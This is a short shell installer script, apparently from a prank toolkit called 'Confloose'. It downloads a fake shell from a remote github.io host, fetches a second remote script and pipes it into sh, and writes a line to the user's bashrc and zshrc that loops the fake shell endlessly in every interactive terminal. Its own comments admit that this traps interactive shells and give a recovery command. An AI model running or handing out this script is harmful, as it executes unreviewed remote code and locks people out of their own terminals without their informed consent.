#!/bin/sh

dir="${AFS_DIR:-$HOME}/.confloose/bin/fake-sh"
mkdir -p "$dir"

curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/fake-sh/sh.sh" > "$dir/sh" || { rm -rf "$dir"; exit 1; }
chmod +x "$dir/sh"

# The `[ -x ... ]` guard matters: without it, a missing binary turns the loop into
# an unthrottled "command not found" spin at 100% CPU in every interactive shell,
# and the terminal never reaches a prompt you could fix it from.
# Recovery (this traps interactive shells): run `bash --noprofile --norc -c 'sed -i "/confloose by leo \[fake-sh\]/d" ~/.bashrc ~/.zshrc'`
# from a non-interactive shell, a GUI editor, or ssh with a command.
echo $(curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-sh" "'if [ -n \"\$PS1\" ] && [ -x \"$dir/sh\" ]; then while [ -x \"$dir/sh\" ]; do \"$dir/sh\"; done; fi'" | sh
for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
